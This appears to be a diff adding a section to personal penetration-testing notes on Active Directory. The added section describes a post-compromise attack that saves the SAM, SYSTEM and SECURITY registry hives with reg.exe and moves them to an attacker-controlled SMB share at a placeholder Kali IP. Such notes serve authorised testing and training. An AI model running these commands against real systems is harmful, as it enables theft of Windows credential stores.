@@ -75,6 +75,45 @@
     - enum bloodhound
     - old vulns
 
+### An other post compromise attack strategy
+#### Attacking SAM
+- [Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager)
+##### Copying SAM Registry Hives
+- hklm\sam
+- hklm\system
+- hklm\security
+- We can create backups of these hives using the reg.exe utility.
+#
+#### Using reg.exe save to copy registry hives.
+ ```
+ C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+The operation completed successfully.
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+
+The operation completed successfully.
+```
+
+#### Creating a Share with impacket-smbserver
+`impacket-smbserver -smb2support shareName someDir`
+
+#### Moving hive copies to share
+```
+C:\> move sam.save \\YOUR_KALI_IP\CompData
+        1 file(s) moved.
+
+C:\> move security.save \\YOUR_KALI_IP\CompData
+        1 file(s) moved.
+
+C:\> move system.save \\YOUR_KALI_IP\CompData
+        1 file(s) moved.
+```
+
 ### Now we own the domain what's next?
 - Provide as much value to the client as possible
     - Put your blinders on and do it again
